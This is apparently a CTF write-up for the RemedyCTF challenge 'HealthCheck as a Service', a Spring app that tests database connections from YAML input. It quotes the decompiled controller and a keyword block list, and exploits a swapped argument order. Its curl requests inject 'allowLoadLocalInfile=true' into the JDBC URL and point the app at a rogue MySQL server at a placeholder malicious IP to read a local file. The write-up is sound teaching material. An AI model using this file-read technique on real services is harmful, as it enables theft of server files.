# HealthCheck as a Service

> [!NOTE]  
> \[🟠]&ensp;**MEDIUM**:&emsp;`14` solves

<br />

"HealthCheck as a Service" was a **medium**-difficulty challenge released in the midst of the **RemedyCTF**. It was the 1 of the 2 tasks related to the `Web` category.<br/><br/>The players are provided with the `HealthCheck.jar` file, which is a Spring application that checks the _database connection_ based on the `YAML` _configuration file_. The `JAR` is not obfuscated and thus the players can get the source code of the application.

<br />

> You better check yo' self before you wreck yo' self

<br />

## 📑&ensp;TLDR

The target Web application is a Spring application that checks the _database connection_ based on the `YAML` _configuration data_ provided by the users within the `POST` requests bodies sent to the `/` endpoint. Due to the **Improper User Input Validation** and **Incorrect Order of Arguments**, malicious users may set up a **rogue MySQL server** and send a specific `POST` request crafted to add the `?allowLoadLocalInfile=true` substring to the `jdbc` connection string in order to read local files.

<br />


## 🔍&ensp;Analysis

### What is going on? ⚙️

#### Notes on the features 🔍

The target application consists of the following major functional blocks:

1. **API Controller**, the `ApiController` public class&ensp;–&ensp;Handles `HTTP` requests and extracts information on the _database configuration_ by processesing the user input as a `YAML`:
```java
@RestController
public class ApiController {
   @PostMapping
   public String checkDatabaseHealth(@RequestBody String str) {
      Validator.validate(str);
      Map<String, Object> yamlConfig = (Map)this.yaml.load(str);
      DbConfig dbConfig = DbConfig.of(yamlConfig.get("hostname").toString(), 
                                    yamlConfig.get("port").toString(),
                                    yamlConfig.get("databaseType").toString(), 
                                    yamlConfig.get("databaseName").toString());
	 DbConfigModel dbConfigModel = new DbConfigModel(dbConfig.getDatabaseType(), dbConfig.getHostname(), dbConfig.getPort(), dbConfig.getDatabaseName());

 .   return this.connectionTestService.isConnectionOk(dbConfigModel) ? "Up" : "Down";
   }
}
```

2. **Validator**, the `validate` public function&ensp;–&ensp;Implements  security checks against a `blockList` of suspicious substrings (`"Script"`, `"Engine"`, `"ClassLoader"`) to filter out potentially malicious payloads:
```java
public static void validate(String payload) {
	String[] blockList = new String[]{"Script", "Engine", "ClassLoader"};
	String[] var2 = blockList;
	int var3 = blockList.length;
  
	for(int var4 = 0; var4 < var3; ++var4) {
		String s = var2[var4];
		
		if (payload.contains(s)) {
			throw new RuntimeException("Dont try to hack me");
		}
	}
}
```

<br/>

> [!NOTE]  
> It is also important to find out what _database drivers_ are supported.<br/>
> Luckily, they are listed in the `classpath.idx` file:
> ```
> ...
> - "BOOT-INF/lib/snakeyaml-1.33.jar"
> - "BOOT-INF/lib/mysql-connector-j-8.4.0.jar"
> - "BOOT-INF/lib/ojdbc8-23.6.0.24.10.jar"
> - "BOOT-INF/lib/kafka-clients-3.7.0.jar"
> - "BOOT-INF/lib/postgresql-42.1.0.jar"
> - "BOOT-INF/lib/mssql-jdbc-12.9.0.jre8-preview.jar"
> ...
> ```

<br/>

#### Standard interaction flow 👆

The **inteded** way of interacting with the target Web application – is sending `POST` requests to the `/` endpoint. Each `POST` request body must contain `hostname`, `port`, `databaseType` and `databaseName` parameters. Such requests trigger the `checkDatabaseHealth` function of the `ApiController` public class and, depending on the results of the processing of the request body provided by the user, the response delivered to the user is either `Up` or `Down`.

<br/>

Here is an example of a valid `POST` request crafted to be sent to the `/` endpoint of the target application:
```bash
curl 'http://<CHALLENGE ADDRESS>/' -X POST -d '{"hostname": "127.0.0.1","port": "5432","databaseType": "postgres","databaseName": "postgres"}' -H "Content-Type: application/json"
```

```yaml
hostname: 127.0.0.1
port: 5432
databaseType: postgres
databaseName: postgres
```

<br/>

### What is the potential attack vector? 🗡

#### Unexpected interaction flow 🪓

`[*]`&ensp;To have a better look at the interaction flow, we ran the target application on the local host and started a simple `HTTP` listener on port `1337` via `netcat`:
```bash
nc -nvlp 1337
```

`[!]`&ensp;We noticed an abnormal behavior:&ensp;the following `POST` request to the local application resulted in a `Down` verdict without any interaction with the `HTTP` listener on port `1337`:
```bash
curl 'http://<LOCAL ADDRESS>/' -X POST -d '{"hostname": "127.0.0.1","port": "1337","databaseType": "mysql","databaseName": "test"}' -H "Content-Type: application/json"
```

```yaml
hostname: 127.0.0.1
port: 1337
databaseType: mysql
databaseName: test
```

<br/>

#### Incorrect Order of Arguments 📥

The `checkDatabaseHealth` function, executed upon receiving the `POST` request, extracts the `hostname`, `port`, `databaseType` and `databaseName` parameters from the request body and passes them to an object of the `DbConfig` class respectively:
```java
@RestController
public class ApiController {
   @PostMapping
   public String checkDatabaseHealth(@RequestBody String str) {
   ...
      DbConfig dbConfig = DbConfig.of(yamlConfig.get("hostname").toString(), 
                                    yamlConfig.get("port").toString(),
                                    yamlConfig.get("databaseType").toString(), 
                                    yamlConfig.get("databaseName").toString());
	...
   }
}
```

```java
public static DbConfig of(String hostname, String port, String databaseType, String databaseName) {
	return new DbConfig(hostname, port, databaseType, databaseName);
}
```

However, the order of the arguments specified in the class contructor, the private `DbConfig`, differs from the one provided above. It is not `hostname, port, databaseType, databaseName`, but rather `databaseType, hostname, port, databaseName`:
```java
 private DbConfig(String databaseType, String hostname, String port, String databaseName)
```

<br/>


## 🔓&ensp;Solution

`[+]`&ensp;In order to exploit the vulnerability, players should rearrange the values passed within the request body. The following `POST` request sent to the local application resulted in a new connection on port `1337`:
```bash
curl 'http://<LOCAL ADDRESS>/' -X POST -d '{"hostname": "mysql","port": "127.0.0.1","databaseType": "1337","databaseName": "test"}' -H "Content-Type: application/json"
```

```yaml
hostname: mysql
port: 127.0.0.1
databaseType: 1337
databaseName: test
```

<br/>

### Exploitation ⚠️

>[!NOTE]  
> Most likely, the author's intended solution was to bypass the `Validator` logic and exploit the [`CVE-2022-1471`](https://nvd.nist.gov/vuln/detail/cve-2022-1471), but we took another approach with the rogue `mysql` server.

<br/>

Because of the improper user input validation, the malicious user can pass the connection property [`allowLoadLocalInfile=true`](https://github.com/mysql/mysql-connector-j/blob/release/8.x/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1784) in the connection string to make the driver allow use of "`LOAD DATA LOCAL INFILE ...`". Thanks to this, we can set up a a **rogue MySQL server** to **read local files** from the client.

1. The connection property `allowLoadLocalInfile=true` may be added to the connection string by injecting the `?allowLoadLocalInfile=true` substring into the value of the `databaseName` parameter of the `POST` request body, since its value is concatenated to the very end of the `jdbcUrl` connection string:
```java
public void checkConnection() {
	String jdbcUrl = "jdbc:" + this.databaseType + "://" + this.hostname + ":" + this.port + "/" + this.databaseName;
	...
}
```

2. The malicious user may set up a **rogue MySQL server**. In our case, it was the [Rogue Mysql Server by rmb122](https://github.com/rmb122/rogue_mysql_server) configured to read the `/home/app/flag.txt` file.

3. To get the flag and successfully solve the task, players had to put all of these the pieces together and send the following request to the target Web application:
```bash
curl 'http://<CHALLENGE ADDRESS>/' -X POST -d '{"hostname": "mysql","port": "MALICIOUS SERVER IP","databaseType": "1337","databaseName": "test?allowLoadLocalInfile=true"}' -H "Content-Type: application/json"
```

```yaml
hostname: mysql
port: MALICIOUS SERVER IP
databaseType: 1337
databaseName: test?allowLoadLocalInfile=true
```

<br/>

## 📑 See also

- \[ 📗 \]&emsp;**Article**:&ensp;‟Resolving CVE-2022-1471 with the SnakeYAML 2.0 Release” by Nova Trauben&ensp;[🔗](https://www.veracode.com/blog/resolving-cve-2022-1471-snakeyaml-20-release-0/)
- \[ 📕 \]&emsp;**CVE**:&ensp;‟`CVE-2022-1471`” by National Vulnerability Database&ensp;[🔗](https://nvd.nist.gov/vuln/detail/cve-2022-1471)
- \[ :octocat: \]&emsp;**Repository**:&ensp;‟Rogue Mysql Server” by rmb122&ensp;[🔗](https://github.com/rmb122/rogue_mysql_server)
- \[ 📘 \]&emsp;**Documentation**:&ensp;‟Security Considerations for LOAD DATA LOCAL” by MySQL&ensp;[🔗](https://dev.mysql.com/doc/mysql-security-excerpt/8.0/en/load-data-local-security.html)
- \[ :octocat: \]&emsp;**Security Issue**:&ensp;‟Arbitrary file read in project import with mysql jdbc url attack” by nbxiglk0&ensp;[🔗](https://github.com/OpenRefine/OpenRefine/security/advisories/GHSA-qqh2-wvmv-h72m)
- \[ 📕 \]&emsp;**CVE**:&ensp;‟`CVE-2023-49198`” by National Vulnerability Database&ensp;[🔗](https://nvd.nist.gov/vuln/detail/cve-2023-49198)
